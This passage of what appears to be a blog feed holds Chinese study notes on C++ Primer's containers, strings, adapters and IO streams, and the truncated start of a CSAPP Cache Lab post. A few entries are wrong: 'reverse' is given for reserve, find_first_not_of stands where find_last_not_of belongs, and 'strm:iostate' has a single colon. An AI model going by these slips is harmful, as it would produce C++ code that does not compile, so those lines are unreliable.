id="大小">大小</h3><table><thead><tr><th>操作</th><th>解释</th></tr></thead><tbody><tr><td><code>c.size()</code></td><td><code>c</code>中元素的数目（不支持<code>forward_list</code>）</td></tr><tr><td><code>c.max_size()</code></td><td><code>c</code>中可保存的最大元素数目</td></tr><tr><td><code>c.empty()</code></td><td>若<code>c</code>中存储了元素，返回<code>false</code>，否则返回<code>true</code></td></tr></tbody></table><h3 id="添加元素">添加元素</h3><table><thead><tr><th>操作</th><th>解释</th></tr></thead><tbody><tr><td><code>c.push_back(t)</code></td><td>在<code>c</code>尾部创建一个值为<code>t</code>的元素，返回<code>void</code></td></tr><tr><td><code>c.emplace_back(args)</code></td><td>同上</td></tr><tr><td><code>c.push_front(t)</code></td><td>在<code>c</code>头部创建一个值为<code>t</code>的元素，返回<code>void</code></td></tr><tr><td><code>c.emplace_front(args)</code></td><td>同上</td></tr><tr><td><code>c.insert(p, t)</code></td><td>在迭代器<code>p</code>指向的元素之前创建一个值是<code>t</code>的元素，返回指向新元素的迭代器</td></tr><tr><td><code>c.emplace(p, args)</code></td><td>同上</td></tr><tr><td><code>c.insert(p, n, t)</code></td><td>在迭代器<code>p</code>指向的元素之前插入<code>n</code>个值为<code>t</code>的元素，返回指向第一个新元素的迭代器；如果<code>n</code>是0，则返回<code>p</code></td></tr><tr><td><code>c.insert(p, b, e)</code></td><td>将迭代器<code>b</code>和<code>e</code>范围内的元素，插入到<code>p</code>指向的元素之前；如果范围为空，则返回<code>p</code></td></tr><tr><td><code>c.insert(p, il)</code></td><td><code>il</code>是一个花括号包围中的元素值列表，将其插入到<code>p</code>指向的元素之前；如果<code>il</code>是空，则返回<code>p</code></td></tr></tbody></table><ul><li>因为这些操作会改变大小，因此不适用于<code>array</code>。</li><li><code>forward_list</code>有自己专有版本的<code>insert</code>和<code>emplace</code>。</li><li><code>forward_list</code>不支持<code>push_back</code>和<code>emplace_back</code>。</li><li>当我们用一个对象去初始化容器或者将对象插入到容器时，实际上放入的是对象的拷贝。</li><li><code>emplace</code>开头的函数是新标准引入的，这些操作是构造而不是拷贝元素。</li><li>传递给<code>emplace</code>的参数必须和元素类型的构造函数相匹配。</li></ul><h3 id="访问元素">访问元素</h3><table><thead><tr><th>操作</th><th>解释</th></tr></thead><tbody><tr><td><code>c.back()</code></td><td>返回<code>c</code>中尾元素的引用。若<code>c</code>为空，函数行为未定义</td></tr><tr><td><code>c.front()</code></td><td>返回<code>c</code>中头元素的引用。若<code>c</code>为空，函数行为未定义</td></tr><tr><td><code>c[n]</code></td><td>返回<code>c</code>中下标是<code>n</code>的元素的引用，<code>n</code>时候一个无符号证书。若<code>n&gt;=c.size()</code>，则函数行为未定义</td></tr><tr><td><code>c.at(n)</code></td><td>返回下标为<code>n</code>的元素引用。如果下标越界，则抛出<code>out_of_range</code>异常</td></tr></tbody></table><ul><li>访问成员函数返回的是引用。</li><li><code>at</code>和下标操作只适用于<code>string</code>、<code>vector</code>、<code>deque</code>、<code>array</code>。</li><li><code>back</code>不适用于<code>forward_list</code>。</li><li>如果希望下标是合法的，可以使用<code>at</code>函数。</li></ul><h3 id="删除元素">删除元素</h3><table><thead><tr><th>操作</th><th>解释</th></tr></thead><tbody><tr><td><code>c.pop_back()</code></td><td>删除<code>c</code>中尾元素，若<code>c</code>为空，则函数行为未定义。函数返回<code>void</code></td></tr><tr><td><code>c.pop_front()</code></td><td>删除<code>c</code>中首元素，若<code>c</code>为空，则函数行为未定义。函数返回<code>void</code></td></tr><tr><td><code>c.erase(p)</code></td><td>删除迭代器<code>p</code>指向的元素，返回一个指向被删除元素之后的元素的迭代器，若<code>p</code>本身是尾后迭代器，则函数行为未定义</td></tr><tr><td><code>c.erase(b, e)</code></td><td>删除迭代器<code>b</code>和<code>e</code>范围内的元素，返回指向最后一个被删元素之后元素的迭代器，若<code>e</code>本身就是尾后迭代器，则返回尾后迭代器</td></tr><tr><td><code>c.clear()</code></td><td>删除<code>c</code>中所有元素，返回<code>void</code></td></tr></tbody></table><ul><li>会改变容器大小，不适用于<code>array</code>。</li><li><code>forward_list</code>有特殊版本的<code>erase</code></li><li><code>forward_list</code>不支持<code>pop_back</code></li><li><code>vector</code>和<code>string</code>不支持<code>pop_front</code></li></ul><h3 id="特殊的forwad-list操作">特殊的forwad_list操作</h3><ul><li>链表在删除元素时需要修改前置节点的内容，双向链表会前驱的指针，但是单向链表没有保存，因此需要增加获取前置节点的方法。</li><li><code>forward_list</code>定义了<code>before_begin</code>，即首前（off-the-begining）迭代器，允许我们再在首元素之前添加或删除元素。</li></ul><table><thead><tr><th>操作</th><th>解释</th></tr></thead><tbody><tr><td><code>lst.before_begin()</code></td><td>返回指向链表首元素之前不存在的元素的迭代器，此迭代器不能解引用。</td></tr><tr><td><code>lst.cbefore_begin()</code></td><td>同上，但是返回的是常量迭代器。</td></tr><tr><td><code>lst.insert_after(p, t)</code></td><td>在迭代器<code>p</code>之后插入元素。<code>t</code>是一个对象</td></tr><tr><td><code>lst.insert_after(p, n, t)</code></td><td>在迭代器<code>p</code>之后插入元素。<code>t</code>是一个对象，<code>n</code>是数量。若<code>n</code>是0则函数行为未定义</td></tr><tr><td><code>lst.insert_after(p, b, e)</code></td><td>在迭代器<code>p</code>之后插入元素。由迭代器<code>b</code>和<code>e</code>指定范围。</td></tr><tr><td><code>lst.insert_after(p, il)</code></td><td>在迭代器<code>p</code>之后插入元素。由<code>il</code>指定初始化列表。</td></tr><tr><td><code>emplace_after(p, args)</code></td><td>使用<code>args</code>在<code>p</code>之后的位置，创建一个元素，返回一个指向这个新元素的迭代器。若<code>p</code>为尾后迭代器，则函数行为未定义。</td></tr><tr><td><code>lst.erase_after(p)</code></td><td>删除<code>p</code>指向位置之后的元素，返回一个指向被删元素之后的元素的迭代器，若<code>p</code>指向<code>lst</code>的尾元素或者是一个尾后迭代器，则函数行为未定义。</td></tr><tr><td><code>lst.erase_after(b, e)</code></td><td>类似上面，删除对象换成从<code>b</code>到<code>e</code>指定的范围。</td></tr></tbody></table><h3 id="改变容器大小">改变容器大小</h3><table><thead><tr><th>操作</th><th>解释</th></tr></thead><tbody><tr><td><code>c.resize(n)</code></td><td>调整<code>c</code>的大小为<code>n</code>个元素，若<code>n&lt;c.size()</code>，则多出的元素被丢弃。若必须添加新元素，对新元素进行值初始化</td></tr><tr><td><code>c.resize(n, t)</code></td><td>调整<code>c</code>的大小为<code>n</code>个元素，任何新添加的元素都初始化为值<code>t</code></td></tr></tbody></table><h3 id="获取迭代器">获取迭代器</h3><table><thead><tr><th>操作</th><th>解释</th></tr></thead><tbody><tr><td><code>c.begin()</code>, <code>c.end()</code></td><td>返回指向<code>c</code>的首元素和尾元素之后位置的迭代器</td></tr><tr><td><code>c.cbegin()</code>, <code>c.cend()</code></td><td>返回<code>const_iterator</code></td></tr></tbody></table><ul><li>以<code>c</code>开头的版本是C++11新标准引入的</li><li>当不需要写访问时，应该使用<code>cbegin</code>和<code>cend</code>。</li></ul><h3 id="反向容器的额外成员">反向容器的额外成员</h3><table><thead><tr><th>操作</th><th>解释</th></tr></thead><tbody><tr><td><code>reverse_iterator</code></td><td>按逆序寻址元素的迭代器</td></tr><tr><td><code>const_reverse_iterator</code></td><td>不能修改元素的逆序迭代器</td></tr><tr><td><code>c.rbegin()</code>, <code>c.rend()</code></td><td>返回指向<code>c</code>的尾元素和首元素之前位置的迭代器</td></tr><tr><td><code>c.crbegin()</code>, <code>c.crend()</code></td><td>返回<code>const_reverse_iterator</code></td></tr></tbody></table><ul><li>不支持<code>forward_list</code></li></ul><h3 id="迭代器">迭代器</h3><ul><li>迭代器范围：<code>begin</code>到<code>end</code>，即第一个元素到最后一个元素的后面一个位置。</li><li>左闭合区间：<code>[begin, end)</code></li><li>左闭合范围蕴含的编程设定：<ul><li>如果<code>begin</code>和<code>end</code>相等，则范围为空。</li><li>如果二者不等，则范围至少包含一个元素，且<code>begin</code>指向该范围中的第一个元素。</li><li>可以对<code>begin</code>递增若干次，使得<code>begin == end</code>。</li></ul></li></ul><h3 id="容器操作可能使迭代器失效">容器操作可能使迭代器失效</h3><ul><li>在向容器添加元素后：<ul><li>如果容器是<code>vector</code>或<code>string</code>，且存储空间被重新分配，则指向容器的迭代器、指针、引用都会失效。</li><li>对于<code>deque</code>，插入到除首尾位置之外的任何位置都会导致指向容器的迭代器、指针、引用失效。如果在首尾位置添加元素，迭代器会失效，但指向存在元素的引用和指针不会失效。</li><li>对于<code>list</code>和<code>forward_list</code>，指向容器的迭代器、指针和引用依然有效。</li></ul></li><li>在从一个容器中删除元素后：<ul><li>对于<code>list</code>和<code>forward_list</code>，指向容器其他位置的迭代器、引用和指针仍然有效。</li><li>对于<code>deque</code>，如果在首尾之外的任何位置删除元素，那么指向被删除元素外其他元素的迭代器、指针、引用都会失效；如果是删除<code>deque</code>的尾元素，则尾后迭代器会失效，但其他不受影响；如果删除的是<code>deque</code>的头元素，这些也不会受影响。</li><li>对于<code>vector</code>和<code>string</code>，指向被删元素之前的迭代器、引用、指针仍然有效。</li><li>注意：当我们删除元素时，尾后迭代器总是会失效。</li><li>注意：使用失效的迭代器、指针、引用是严重的运行时错误！</li><li>建议：将要求迭代器必须保持有效的程序片段最小化。</li><li>建议：不要保存<code>end</code>返回的迭代器。</li></ul></li></ul><h3 id="容器内元素的类型约束">容器内元素的类型约束</h3><ul><li>元素类型必须支持赋值运算；</li><li>元素类型的对象必须可以复制。</li><li>除了输入输出标准库类型外，其他所有标准库类型都是有效的容器元素类型。</li></ul><h2 id="vector对象是如何增长的">vector对象是如何增长的</h2><p><code>vector</code>和<code>string</code>在内存中是连续保存的，如果原先分配的内存位置已经使用完，则需要重新分配新空间，将已有元素从就位置移动到新空间中，然后添加新元素。</p><h3 id="管理容量的成员函数">管理容量的成员函数</h3><table><thead><tr><th>操作</th><th>解释</th></tr></thead><tbody><tr><td><code>c.shrink_to_fit()</code></td><td>将<code>capacity()</code>减少到和<code>size()</code>相同大小</td></tr><tr><td><code>c.capacity()</code></td><td>不重新分配内存空间的话，<code>c</code>可以保存多少个元素</td></tr><tr><td><code>c.reverse(n)</code></td><td>分配至少能容纳<code>n</code>个元素的内存空间</td></tr></tbody></table><ul><li><code>shrink_to_fit</code>只适用于<code>vector</code>、<code>string</code>和<code>deque</code></li><li><code>capacity</code>和<code>reverse</code>只适用于<code>vector</code>和<code>string</code>。</li></ul><h2 id="额外的string操作">额外的string操作</h2><h3 id="构造string的其他方法">构造string的其他方法</h3><table><thead><tr><th>操作</th><th>解释</th></tr></thead><tbody><tr><td><code>string s(cp, n)</code></td><td><code>s</code>是<code>cp</code>指向的数组中前<code>n</code>个字符的拷贝，此数组</td></tr><tr><td><code>string s(s2, pos2)</code></td><td><code>s</code>是<code>string s2</code>从下标<code>pos2</code>开始的字符的拷贝。若<code>pos2 &gt; s2.size()</code>，则构造函数的行为未定义。</td></tr><tr><td><code>string s(s2, pos2, len2)</code></td><td><code>s</code>是<code>string s2</code>从下标<code>pos2</code>开始的<code>len2</code>个字符的拷贝。</td></tr></tbody></table><ul><li><code>n</code>,<code>len2</code>,<code>pos2</code>都是无符号值。</li></ul><h3 id="substr操作">substr操作</h3><table><thead><tr><th>操作</th><th>解释</th></tr></thead><tbody><tr><td><code>s.substr(pos, n)</code></td><td>返回一个<code>string</code>，包含<code>s</code>中从<code>pos</code>开始的<code>n</code>个字符的拷贝。<code>pos</code>的默认值是0，<code>n</code>的默认值是<code>s.size() - pos</code>，即拷贝从<code>pos</code>开始的所有字符。</td></tr></tbody></table><h3 id="改变string的其他方法">改变string的其他方法</h3><table><thead><tr><th>操作</th><th>解释</th></tr></thead><tbody><tr><td><code>s.insert(pos, args)</code></td><td>在<code>pos</code>之前插入<code>args</code>指定的字符。<code>pos</code>可以使是下标或者迭代器。接受下标的版本返回指向<code>s</code>的引用；接受迭代器的版本返回指向第一个插入字符的迭代器。</td></tr><tr><td><code>s.erase(pos, len)</code></td><td>删除从<code>pos</code>开始的<code>len</code>个字符，如果<code>len</code>被省略，则删除后面所有字符，返回指向<code>s</code>的引用。</td></tr><tr><td><code>s.assign(args)</code></td><td>将<code>s</code>中的字符替换成<code>args</code>指定的字符。返回一个指向<code>s</code>的引用。</td></tr><tr><td><code>s.append(args)</code></td><td>将<code>args</code>指定的字符追加到<code>s</code>，返回一个指向<code>s</code>的引用。</td></tr><tr><td><code>s.replace(range, args)</code></td><td>删除<code>s</code>中范围<code>range</code>中的字符，替换成<code>args</code>指定的字符。返回一个指向<code>s</code>的引用。</td></tr></tbody></table><h3 id="string搜索操作">string搜索操作</h3><ul><li><code>string</code>类提供了6个不同的搜索函数，每个函数都有4个重载版本。</li><li>每个搜索操作都返回一个<code>string::size_type</code>值，表示匹配发生位置的下标。如果搜索失败则返回一个名为<code>string::npos</code>的<code>static</code>成员（类型是<code>string::size_type</code>，初始化值是-1，也就是<code>string</code>最大的可能大小）。</li></ul><table><thead><tr><th>搜索操作</th><th>解释</th></tr></thead><tbody><tr><td><code>s.find(args)</code></td><td>查找<code>s</code>中<code>args</code>第一次出现的位置</td></tr><tr><td><code>s.rfind(args)</code></td><td>查找<code>s</code>中<code>args</code>最后一次出现的位置</td></tr><tr><td><code>s.find_first_of(args)</code></td><td>在<code>s</code>中查找<code>args</code>中任何一个字符第一次出现的位置</td></tr><tr><td><code>s.find_last_of(args)</code></td><td>在<code>s</code>中查找<code>args</code>中任何一个字符最后一次出现的位置</td></tr><tr><td><code>s.find_first_not_of(args)</code></td><td>在<code>s</code>中查找第一个不在<code>args</code>中的字符</td></tr><tr><td><code>s.find_first_not_of(args)</code></td><td>在<code>s</code>中查找最后一个不在<code>args</code>中的字符</td></tr></tbody></table><p>args必须是一下的形式之一：</p><table><thead><tr><th><code>args</code>形式</th><th>解释</th></tr></thead><tbody><tr><td><code>c, pos</code></td><td>从<code>s</code>中位置<code>pos</code>开始查找字符<code>c</code>。<code>pos</code>默认是0</td></tr><tr><td><code>s2, pos</code></td><td>从<code>s</code>中位置<code>pos</code>开始查找字符串<code>s</code>。<code>pos</code>默认是0</td></tr><tr><td><code>cp, pos</code></td><td>从<code>s</code>中位置<code>pos</code>开始查找指针<code>cp</code>指向的以空字符结尾的C风格字符串。<code>pos</code>默认是0</td></tr><tr><td><code>cp, pos, n</code></td><td>从<code>s</code>中位置<code>pos</code>开始查找指针<code>cp</code>指向的前<code>n</code>个字符。<code>pos</code>和<code>n</code>无默认值。</td></tr></tbody></table><h3 id="s-compare的几种参数形式">s.compare的几种参数形式</h3><p>逻辑类似于C标准库的<code>strcmp</code>函数，根据<code>s</code>是等于、大于还是小于参数指定的字符串，<code>s.compare</code>返回0、正数或负数。</p><table><thead><tr><th>参数形式</th><th>解释</th></tr></thead><tbody><tr><td><code>s2</code></td><td>比较<code>s</code>和<code>s2</code></td></tr><tr><td><code>pos1, n1, s2</code></td><td>比较<code>s</code>从<code>pos1</code>开始的<code>n1</code>个字符和<code>s2</code></td></tr><tr><td><code>pos1, n1, s2, pos2, n2</code></td><td>比较<code>s</code>从<code>pos1</code>开始的<code>n1</code>个字符和<code>s2</code></td></tr><tr><td><code>cp</code></td><td>比较<code>s</code>和<code>cp</code>指向的以空字符结尾的字符数组</td></tr><tr><td><code>pos1, n1, cp</code></td><td>比较<code>s</code>从<code>pos1</code>开始的<code>n1</code>个字符和<code>cp</code>指向的以空字符结尾的字符数组</td></tr><tr><td><code>pos1, n1, cp, n2</code></td><td>比较<code>s</code>从<code>pos1</code>开始的<code>n1</code>个字符和<code>cp</code>指向的地址开始<code>n2</code>个字符</td></tr></tbody></table><h3 id="string和数值转换">string和数值转换</h3><table><thead><tr><th>转换</th><th>解释</th></tr></thead><tbody><tr><td><code>to_string(val)</code></td><td>一组重载函数，返回数值<code>val</code>的<code>string</code>表示。<code>val</code>可以使任何算术类型。对每个浮点类型和<code>int</code>或更大的整型，都有相应版本的<code>to_string()</code>。和往常一样，小整型会被提升。</td></tr><tr><td><code>stoi(s, p, b)</code></td><td>返回<code>s</code>起始子串（表示整数内容）的数值，<code>p</code>是<code>s</code>中第一个非数值字符的下标，默认是0，<code>b</code>是转换所用的基数。返回<code>int</code></td></tr><tr><td><code>stol(s, p, b)</code></td><td>返回<code>long</code></td></tr><tr><td><code>stoul(s, p, b)</code></td><td>返回<code>unsigned long</code></td></tr><tr><td><code>stoll(s, p, b)</code></td><td>返回<code>long long</code></td></tr><tr><td><code>stoull(s, p, b)</code></td><td>返回<code>unsigned long long</code></td></tr><tr><td><code>stof(s, p)</code></td><td>返回<code>s</code>起始子串（表示浮点数内容）的数值，<code>p</code>是<code>s</code>中第一个非数值字符的下标，默认是0。返回<code>float</code></td></tr><tr><td><code>stod(s, p)</code></td><td>返回<code>double</code></td></tr><tr><td><code>stold(s, p)</code></td><td>返回<code>long double</code></td></tr></tbody></table><h2 id="容器适配器（adapter）">容器适配器（adapter）</h2><ul><li>适配器是使一事物的行为类似于另一事物的行为的一种机制，例如<code>stack</code>可以使任何一种顺序容器以栈的方式工作。</li><li>初始化 <code>deque&lt;int&gt; deq; stack&lt;int&gt; stk(deq);</code> 从<code>deq</code>拷贝元素到<code>stk</code>。</li><li>创建适配器时，指定一个顺序容器，可以覆盖默认的基础容器： <code>stack&lt;string, vector&lt;string&gt; &gt; str_stk;</code>。</li></ul><h3 id="适配器的通用操作和类型">适配器的通用操作和类型</h3><table><thead><tr><th>操作</th><th>解释</th></tr></thead><tbody><tr><td><code>size_type</code></td><td>一种类型，须以保存当前类型的最大对象的大小</td></tr><tr><td><code>value_type</code></td><td>元素类型</td></tr><tr><td><code>container_type</code></td><td>实现适配器的底层容器类型</td></tr><tr><td><code>A a;</code></td><td>创建一个名为<code>a</code>的空适配器</td></tr><tr><td><code>A a(c)</code></td><td>创建一个名为<code>a</code>的适配器，带有容器<code>c</code>的一个拷贝</td></tr><tr><td>关系运算符</td><td>每个适配器都支持所有关系运算符：<code>==</code>、<code>!=</code>、<code>&lt;</code>、 <code>&lt;=</code>、<code>&gt;</code>、<code>&gt;=</code>这些运算符返回底层容器的比较结果</td></tr><tr><td><code>a.empty()</code></td><td>若<code>a</code>包含任何元素，返回<code>false</code>;否则返回<code>true</code></td></tr><tr><td><code>a.size()</code></td><td>返回<code>a</code>中的元素数目</td></tr><tr><td><code>swap(a, b)</code></td><td>交换<code>a</code>和<code>b</code>的内容，<code>a</code>和<code>b</code>必须有相同类型，包括底层容器类型也必须相同</td></tr><tr><td><code>a.swap(b)</code></td><td>同上</td></tr></tbody></table><h3 id="stack">stack</h3><table><thead><tr><th>操作</th><th>解释</th></tr></thead><tbody><tr><td><code>s.pop()</code></td><td>删除栈顶元素，不返回。</td></tr><tr><td><code>s.push(item)</code></td><td>创建一个新元素，压入栈顶，该元素通过拷贝或移动<code>item</code>而来</td></tr><tr><td><code>s.emplace(args)</code></td><td>同上，但元素由<code>args</code>来构造。</td></tr><tr><td><code>s.top()</code></td><td>返回栈顶元素，不删除。</td></tr></tbody></table><ul><li>定义在<code>stack</code>头文件中。</li><li><code>stack</code>默认基于<code>deque</code>实现，也可以在<code>list</code>或<code>vector</code>之上实现。</li></ul><h3 id="queue和priority-queue">queue和priority_queue</h3><table><thead><tr><th>操作</th><th>解释</th></tr></thead><tbody><tr><td><code>q.pop()</code></td><td>删除队首元素，但不返回。</td></tr><tr><td><code>q.front()</code></td><td>返回队首元素的值，不删除。</td></tr><tr><td><code>q.back()</code></td><td>返回队尾元素的值，不删除。只适用于<code>queue</code></td></tr><tr><td><code>q.top()</code></td><td>返回具有最高优先级的元素值，不删除。</td></tr><tr><td><code>q.push(item)</code></td><td>在队尾压入一个新元素。</td></tr><tr><td><code>q.emplace(args)</code></td><td></td></tr></tbody></table><ul><li>定义在<code>queue</code>头文件中。</li><li><code>queue</code>默认基于<code>deque</code>实现，<code>priority_queue</code>默认基于<code>vector</code>实现。</li><li><code>queue</code>可以在<code>list</code>或<code>vector</code>之上实现，<code>priority_queue</code>也可以用<code>deque</code>实现。</li></ul>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> 《C++ Primer 5th》 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>第8章 IO库</title>
      <link href="/2023/09/03/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch08/"/>
      <url>/2023/09/03/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch08/</url>
      
        <content type="html"><![CDATA[<h2 id="前面章节已经在用的IO库设施">前面章节已经在用的IO库设施</h2><ul><li><strong>istream</strong>：输入流类型，提供输入操作。</li><li><strong>ostream</strong>：输出流类型，提供输出操作</li><li><strong>cin</strong>：一个<code>istream</code>对象，从标准输入读取数据。</li><li><strong>cout</strong>：一个<code>ostream</code>对象，向标准输出写入数据。</li><li><strong>cerr</strong>：一个<code>ostream</code>对象，向标准错误写入消息。</li><li><strong>&gt;&gt;运算符</strong>：用来从一个<code>istream</code>对象中读取输入数据。</li><li><strong>&lt;&lt;运算符</strong>：用来向一个<code>ostream</code>对象中写入输出数据。</li><li><strong>getline函数</strong>：从一个给定的<code>istream</code>对象中读取一行数据，存入到一个给定的<code>string</code>对象中。</li></ul><h2 id="IO类">IO类</h2><h3 id="标准库定义的IO类型">标准库定义的IO类型</h3><ul><li><code>iostream</code>头文件：从标准流中读写数据，<code>istream</code>、<code>ostream</code>等。</li><li><code>fstream</code>头文件：从文件中读写数据，<code>ifstream</code>、<code>ofstream</code>等。</li><li><code>sstream</code>头文件：从字符串中读写数据，<code>istringstream</code>、<code>ostringstream</code></li></ul><h3 id="IO对象不可复制或赋值">IO对象不可复制或赋值</h3><ul><li>1.IO对象不能存在容器里.</li><li>2.形参和返回类型也不能是流类型。</li><li>3.形参和返回类型一般是流的<strong>引用</strong>。</li><li>4.读写一个IO对象会改变其状态，因此传递和返回的引用不能是<code>const</code>的。</li></ul><h3 id="条件状态">条件状态</h3><table><thead><tr><th>状态</th><th>解释</th></tr></thead><tbody><tr><td><code>strm:iostate</code></td><td>是一种机器无关的<strong>类型</strong>，提供了表达条件状态的完整功能</td></tr><tr><td><code>strm:badbit</code></td><td>用来指出流已经崩溃</td></tr><tr><td><code>strm:failbit</code></td><td>用来指出一个IO操作失败了</td></tr><tr><td><code>strm:eofbit</code></td><td>用来指出流到达了文件结束</td></tr><tr><td><code>strm:goodbit</code></td><td>用来指出流未处于错误状态，此值保证为零</td></tr><tr><td><code>s.eof()</code></td><td>若流<code>s</code>的<code>eofbit</code>置位，则返回<code>true</code></td></tr><tr><td><code>s.fail()</code></td><td>若流<code>s</code>的<code>failbit</code>置位，则返回<code>true</code></td></tr><tr><td><code>s.bad()</code></td><td>若流<code>s</code>的<code>badbit</code>置位，则返回<code>true</code></td></tr><tr><td><code>s.good()</code></td><td>若流<code>s</code>处于有效状态，则返回<code>true</code></td></tr><tr><td><code>s.clear()</code></td><td>将流<code>s</code>中所有条件状态位复位，将流的状态设置成有效，返回<code>void</code></td></tr><tr><td><code>s.clear(flags)</code></td><td>将流<code>s</code>中指定的条件状态位复位，返回<code>void</code></td></tr><tr><td><code>s.setstate(flags)</code></td><td>根据给定的标志位，将流<code>s</code>中对应的条件状态位置位，返回<code>void</code></td></tr><tr><td><code>s.rdstate()</code></td><td>返回流<code>s</code>的当前条件状态，返回值类型为<code>strm::iostate</code></td></tr></tbody></table><p>上表中，<code>strm</code>是一种IO类型，（如<code>istream</code>）， <code>s</code>是一个流对象。</p><h3 id="管理输出缓冲">管理输出缓冲</h3><ul><li>每个输出流都管理一个缓冲区，执行输出的代码，文本串可能立即打印出来，也可能被操作系统保存在缓冲区内，随后再打印。</li><li>刷新缓冲区，可以使用如下IO操纵符：<ul><li><code>endl</code>：输出一个换行符并刷新缓冲区。</li><li><code>flush</code>：刷新流，单不添加任何字符。</li><li><code>ends</code>：在缓冲区插入空字符<code>null</code>，然后刷新。</li><li><code>unitbuf</code>：告诉流接下来每次操作之后都要进行一次<code>flush</code>操作。</li><li><code>nounitbuf</code>：回到正常的缓冲方式。</li></ul></li></ul><h2 id="文件输入输出">文件输入输出</h2><ul><li>头文件<code>fstream</code>定义了三个类型来支持文件IO：<ul><li><code>ifstream</code>从一个给定文件读取数据。</li><li><code>ofstream</code>向一个给定文件写入数据。</li><li><code>fstream</code>可以读写给定文件。</li></ul></li><li><strong>文件流</strong>：需要读写文件时，必须定义自己的文件流对象，并绑定在需要的文件上。</li></ul><h3 id="fstream特有的操作">fstream特有的操作</h3><table><thead><tr><th>操作</th><th>解释</th></tr></thead><tbody><tr><td><code>fstream fstrm;</code></td><td>创建一个未绑定的文件流。</td></tr><tr><td><code>fstream fstrm(s);</code></td><td>创建一个文件流，并打开名为<code>s</code>的文件，<code>s</code>可以是<code>string</code>也可以是<code>char</code>指针</td></tr><tr><td><code>fstream fstrm(s, mode);</code></td><td>与前一个构造函数类似，但按指定<code>mode</code>打开文件</td></tr><tr><td><code>fstrm.open(s)</code></td><td>打开名为<code>s</code>的文件，并和<code>fstrm</code>绑定</td></tr><tr><td><code>fstrm.close()</code></td><td>关闭和<code>fstrm</code>绑定的文件</td></tr><tr><td><code>fstrm.is_open()</code></td><td>返回一个<code>bool</code>值，指出与<code>fstrm</code>关联的文件是否成功打开且尚未关闭</td></tr></tbody></table><p>上表中，<code>fstream</code>是头文件<code>fstream</code>中定义的一个类型，<code>fstrm</code>是一个文件流对象。</p><h3 id="文件模式">文件模式</h3><table><thead><tr><th>文件模式</th><th>解释</th></tr></thead><tbody><tr><td><code>in</code></td><td>以读的方式打开</td></tr><tr><td><code>out</code></td><td>以写的方式打开</td></tr><tr><td><code>app</code></td><td>每次写操作前均定位到文件末尾</td></tr><tr><td><code>ate</code></td><td>打开文件后立即定位到文件末尾</td></tr><tr><td><code>trunc</code></td><td>截断文件</td></tr><tr><td><code>binary</code></td><td>以二进制方式进行IO操作。</td></tr></tbody></table><h2 id="string流">string流</h2><ul><li>头文件<code>sstream</code>定义了三个类型来支持内存IO：<ul><li><code>istringstream</code>从<code>string</code>读取数据。</li><li><code>ostringstream</code>向<code>string</code>写入数据。</li><li><code>stringstream</code>可以读写给定<code>string</code>。</li></ul></li></ul><h3 id="stringstream特有的操作">stringstream特有的操作</h3><table><thead><tr><th>操作</th><th>解释</th></tr></thead><tbody><tr><td><code>sstream strm</code></td><td>定义一个未绑定的<code>stringstream</code>对象</td></tr><tr><td><code>sstream strm(s)</code></td><td>用<code>s</code>初始化对象</td></tr><tr><td><code>strm.str()</code></td><td>返回<code>strm</code>所保存的<code>string</code>的拷贝</td></tr><tr><td><code>strm.str(s)</code></td><td>将<code>s</code>拷贝到<code>strm</code>中，返回<code>void</code></td></tr></tbody></table><p>上表中<code>sstream</code>是头文件<code>sstream</code>中任意一个类型。<code>s</code>是一个<code>string</code>。</p>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> 《C++ Primer 5th》 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP - Cache Lab 详解</title>
      <link href="/2023/09/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l4-cachelab/"/>
      <url>/2023/09/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l4-cachelab/</url>
      
        <content type="html"><![CDATA[<p><a href="https://csapp.cs.cmu.edu/im/labs/cachelab.tar"><em>Cache Lab</em></a> <strong>[Updated 5/2/16]</strong> (<a href="http://csapp.cs.cmu.edu/3e/README-cachelab">README</a>, <a href="http://csapp.cs.cmu.edu/3e/cachelab.pdf">Writeup</a>, <a href="http://csapp.cs.cmu.edu/3e/cachelab-release.html">Release Notes</a>, <a href="http://csapp.cs.cmu.edu/3e/cachelab-handout.tar">Self-Study Handout</a>)</p><blockquote><p>At CMU we use this lab in place of the Performance Lab. Students write a general-purpose cache simulator, and then optimize a small matrix transpose kernel to minimize the number of misses on a simulated cache. This lab uses the Valgrind tool to generate address traces.</p><p>Note: This lab must be run on a 64-bit x86-64 system.</p></blockquote><h1 id="前言">前言</h1><p>本篇博客将会介绍 CSAPP 之 CacheLab 的解题过程，分为 Part A 和 Part B 两个部分，其中 Part A 要求使用代码模拟一个高速缓存存储器，Part B 要求优化矩阵的转置运算，此外在介绍正式解题部分前，给出LRU和LFU这两种缓存更新算法的代码。</p><h1 id="LRU和LFU缓存更新算法">LRU和LFU缓存更新算法</h1><blockquote><p>本实验使用的缓存更新算法为LRU（Least Recently Used），推荐去leetocde上做下LRU和LFU的算法题（面试高频）。</p></blockquote><h2 id="146-LRU-Cache"><a href="https://leetcode.com/problems/lru-cache/">146. LRU Cache</a></h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 